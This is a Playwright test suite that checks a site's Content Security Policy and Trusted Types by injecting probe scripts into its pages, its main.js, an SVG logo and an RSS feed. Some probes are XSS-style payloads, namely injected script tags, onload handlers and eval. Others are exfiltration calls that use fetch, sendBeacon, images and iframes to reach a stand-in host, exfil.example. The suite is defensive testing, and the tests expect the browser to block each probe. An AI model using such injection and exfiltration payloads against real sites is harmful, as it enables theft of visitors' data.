import { expect, test, type Page } from '@playwright/test';

// A policy string alone cannot prove that a browser refuses injected code.
// These harmless probes never send data or touch browser storage.
//
// Each probe arrives the way an attack would: as markup injected into the
// served HTML, or as extra code inside a script the policy lets run (our own
// main.js standing in for a compromised dependency). Trusted Types refuses
// the DOM's own ways of injecting a script, so the probes cannot add one.

/** Stub Turnstile, and append `probe` to the site's own main.js. */
async function compromiseMainJs(page: Page, probe: string) {
  await page.route('**/challenges.cloudflare.com/**', (route) => route.fulfill({
    contentType: 'text/javascript',
    body: 'window.turnstile={getResponse:()=>"journey-token",reset(){},render(){}};',
  }));
  await page.route('**/assets/js/main.js*', async (route) => {
    const original = await route.fetch();
    await route.fulfill({ response: original, body: `${await original.text()}\n;${probe}` });
  });
}

/** Collect every CSP violation from the first byte, outside the page's policy. */
async function recordViolations(page: Page) {
  await page.addInitScript(() => {
    const seen: string[] = [];
    document.addEventListener('securitypolicyviolation', (event) => {
      seen.push(`${event.effectiveDirective} ${event.blockedURI}`);
    });
    Object.defineProperty(window, '__violations', { value: seen });
  });
  return () => page.evaluate(() => (window as unknown as { __violations: string[] }).__violations);
}

// Writes a string into each DOM sink that turns text into HTML or code and
// records, per sink, whether the browser allowed it or what it threw. Nothing
// written is attached to the document, so a sink that is allowed changes nothing.
const SINK_PROBE = `(() => {
  const results = {};
  const attempt = (name, write) => {
    try { write(); results[name] = 'allowed'; } catch (error) { results[name] = error.name; }
  };
  attempt('innerHTML', () => { document.createElement('div').innerHTML = '<a href="/">x</a>'; });
  attempt('outerHTML', () => { const p = document.createElement('p'); document.createElement('div').append(p); p.outerHTML = '<p>x</p>'; });
  attempt('insertAdjacentHTML', () => { document.createElement('div').insertAdjacentHTML('beforeend', '<form></form>'); });
  attempt('DOMParser', () => { new DOMParser().parseFromString('<p>x</p>', 'text/html'); });
  attempt('createContextualFragment', () => { document.createRange().createContextualFragment('<p>x</p>'); });
  attempt('iframe srcdoc', () => { document.createElement('iframe').srcdoc = '<p>x</p>'; });
  attempt('script src', () => { document.createElement('script').src = '/csp-probe.js'; });
  attempt('script text', () => { document.createElement('script').textContent = 'void 0'; });
  attempt('event handler attribute', () => { document.createElement('button').setAttribute('onclick', 'void 0'); });
  attempt('new policy', () => { trustedTypes.createPolicy('probe', { createHTML: (s) => s }); });
  try { Function('document.documentElement.dataset.probeEval = "ran"')(); } catch {}
  document.documentElement.dataset.sinkProbe = JSON.stringify(results);
})();`;

const REFUSED = {
  innerHTML: 'TypeError',
  outerHTML: 'TypeError',
  insertAdjacentHTML: 'TypeError',
  DOMParser: 'TypeError',
  createContextualFragment: 'TypeError',
  'iframe srcdoc': 'TypeError',
  'script src': 'TypeError',
  'script text': 'TypeError',
  'event handler attribute': 'TypeError',
  'new policy': 'TypeError',
};

test('pages refuse unapproved scripts, event handlers, eval and HTML strings', async ({ page }) => {
  await compromiseMainJs(page, SINK_PROBE);
  const violations = await recordViolations(page);
  // Stored-XSS stand-in: markup injected into the HTML as it is served.
  await page.route('**/*', async (route) => {
    if (route.request().resourceType() !== 'document') return route.fallback();
    const original = await route.fetch();
    const body = (await original.text()).replace(/<meta http-equiv="refresh"[^>]*>/i, '');
    const injection = [
      '<script>document.documentElement.dataset.probeInline="ran"</script>',
      '<img alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="document.documentElement.dataset.probeHandler=\'ran\'">',
    ].join('');
    const html = body.includes('</body>') ? body.replace('</body>', `${injection}</body>`) : `${body}${injection}`;
    await route.fulfill({ response: original, body: html });
  });

  for (const path of ['/', '/contact/', '/field-notes/', '/services.html/index.html', '/no-such-page-security/']) {
    await page.goto(path);
    // A redirect stub has no main.js locally (and 301s to /services/ live), so
    // only assert the DOM-sink probe when main.js ran on the landed page.
    const hasMain = (await page.locator('script[src*="/assets/js/main.js"]').count()) > 0;
    if (hasMain) await expect(page.locator('html')).toHaveAttribute('data-sink-probe', /./);
    // Violation events are queued by the browser, after script execution.
    await page.waitForTimeout(100);
    const result = await page.evaluate(() => ({
      inline: document.documentElement.dataset.probeInline === 'ran',
      handler: document.documentElement.dataset.probeHandler === 'ran',
      eval: document.documentElement.dataset.probeEval === 'ran',
      sinks: document.documentElement.dataset.sinkProbe
        ? (JSON.parse(document.documentElement.dataset.sinkProbe) as Record<string, string>)
        : null,
    }));
    expect(result, path).toEqual({ inline: false, handler: false, eval: false, sinks: hasMain ? REFUSED : null });
    // Eval of a string is a Trusted Types sink too, refused before script-src
    // (which has no 'unsafe-eval' either; tests/csp.test.ts) is consulted.
    const directives = new Set((await violations()).map((v) => v.split(' ')[0]));
    expect([...directives].sort(), path).toEqual(
      hasMain
        ? ['require-trusted-types-for', 'script-src-attr', 'script-src-elem', 'trusted-types']
        : ['img-src', 'script-src-attr', 'script-src-elem'],
    );
  }
});

// /contact/'s one Trusted Types policy loads Turnstile's exact URL and
// nothing else: a script that reaches it cannot load another script with it.
test('the contact page can load only the Turnstile script', async ({ page }) => {
  await compromiseMainJs(page, `(() => {
    const created = (name) => { try { trustedTypes.createPolicy(name, { createScriptURL: (u) => u }); return 'allowed'; } catch (e) { return e.name; } };
    document.documentElement.dataset.policyProbe = created('turnstile');
  })();`);
  const violations = await recordViolations(page);
  await page.goto('/contact/');
  await page.locator('#contact-form input').first().focus();
  await expect(page.locator('script[src^="https://challenges.cloudflare.com/turnstile/v0/api.js"]')).toHaveCount(1);
  // The page created its policy first, so a second 'turnstile' policy is refused.
  await expect(page.locator('html')).toHaveAttribute('data-policy-probe', 'TypeError');
  expect((await violations()).filter((v) => v.startsWith('require-trusted-types-for'))).toEqual([]);
});

// Even code the policy lets run (our own scripts, a dependency, Turnstile)
// cannot send a visitor's data elsewhere: every way out to another origin is
// refused by the browser before a request is made.
test('pages cannot send data to any other origin', async ({ page }) => {
  const leaked: string[] = [];
  await page.route('**/exfil.example/**', (route) => {
    leaked.push(route.request().url());
    return route.fulfill({ status: 204 });
  });
  await compromiseMainJs(page, `(() => {
    const out = 'https://exfil.example/collect?d=probe';
    fetch(out, { mode: 'no-cors' }).catch(() => {});
    try { navigator.sendBeacon(out, 'probe'); } catch {}
    const img = new Image(); img.src = out + '&via=img';
    const frame = document.createElement('iframe'); frame.src = out + '&via=frame'; document.body.append(frame);
    document.documentElement.dataset.exfilProbe = 'sent';
  })();`);
  const violations = await recordViolations(page);

  for (const path of ['/', '/contact/', '/field-notes/']) {
    await page.goto(path);
    await expect(page.locator('html')).toHaveAttribute('data-exfil-probe', 'sent');
    await page.waitForTimeout(300);
    const refused = (await violations()).filter((v) => v.includes('https://exfil.example')).map((v) => v.split(' ')[0]);
    expect([...new Set(refused)].sort(), path).toEqual(['connect-src', 'frame-src', 'img-src']);
  }
  expect(leaked).toEqual([]);
});

// SVG and XML are active markup formats in browsers when opened directly and
// carry no <meta> tag; in production the edge Worker stamps default-src 'none'
// and Trusted Types on them. Local preview has no Worker in front (covered by
// tests/edge-worker.test.ts), so this browser probe runs against JOURNEY_URL.
test('active SVG and XML endpoints refuse injected scripts and outbound requests', async ({ page }) => {
  test.skip(!process.env.JOURNEY_URL, 'edge Worker header is served on the live/preview-worker origin');
  const leaked: string[] = [];
  await page.route('**/exfil.example/**', (route) => {
    leaked.push(route.request().url());
    return route.fulfill({ status: 204 });
  });
  await page.route('**/*', async (route) => {
    const url = new URL(route.request().url());
    if (url.pathname !== '/assets/images/logo.svg' && url.pathname !== '/field-notes/rss.xml') {
      return route.fallback();
    }
    const original = await route.fetch();
    const text = await original.text();
    const body = url.pathname.endsWith('.svg')
      ? text.replace('</svg>', '<script>document.documentElement.setAttribute("data-ran","1");fetch("https://exfil.example/svg",{mode:"no-cors"}).catch(()=>{})</script></svg>')
      : text.replace('</rss>', '<script xmlns="http://www.w3.org/1999/xhtml">document.documentElement.setAttribute("data-ran","1");fetch("https://exfil.example/xml",{mode:"no-cors"}).catch(()=>{})</script></rss>');
    return route.fulfill({ response: original, body });
  });

  for (const path of ['/assets/images/logo.svg', '/field-notes/rss.xml']) {
    await page.goto(path);
    await page.waitForTimeout(150);
    const ran = await page.evaluate(() => document.documentElement.getAttribute('data-ran'));
    expect(ran, path).toBeNull();
  }
  expect(leaked).toEqual([]);
});
